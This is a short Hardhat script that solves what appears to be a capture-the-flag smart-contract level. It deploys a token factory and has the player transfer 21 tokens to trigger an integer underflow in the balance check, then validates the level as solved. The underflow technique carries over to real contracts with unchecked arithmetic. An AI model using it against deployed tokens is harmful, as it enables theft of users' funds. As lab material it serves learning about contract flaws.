const { ethers } = require('hardhat');

async function main() {
  const [owner, player] = await ethers.getSigners();

  console.log("\n[0] original owner: ", owner.address);
  console.log("[0] player: ", player.address);

  console.log("\n[1] deploy TokenFactory");
  const Factory = await ethers.getContractFactory("TokenFactory");
  const factory = await Factory.connect(owner).deploy();
  await factory.deployed();
  console.log("---- TokenFactory address: ", factory.address);

  console.log("\n[2] create a Token instance");
  const receipt = await factory.connect(player).createInstance(player.address);
  const instance_address = (await receipt.wait()).events[0].args[0];
  const token = await ethers.getContractAt("Token", instance_address, owner);
  console.log("---- factory balance:   ", (await token.balanceOf(factory.address)).toString());
  console.log("---- owner balance:     ", (await token.balanceOf(owner.address)).toString());
  console.log("---- player balance:    ", (await token.balanceOf(player.address)).toString());

  console.log("\n[3] invoke Underflow");
  await token.connect(player).transfer(owner.address, 21);
  console.log("---- factory balance:   ", (await token.balanceOf(factory.address)).toString());
  console.log("---- owner balance:     ", (await token.balanceOf(owner.address)).toString());
  console.log("---- player balance:    ", (await token.balanceOf(player.address)).toString());

  console.log("\n[4] validate solved");
  const res = await factory.validateInstance(token.address, player.address);

  if ((await res.wait()).events[0].args[0] == true) {
    console.log("[+] Done!");
  } else {
    console.log("[+] Fail...");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

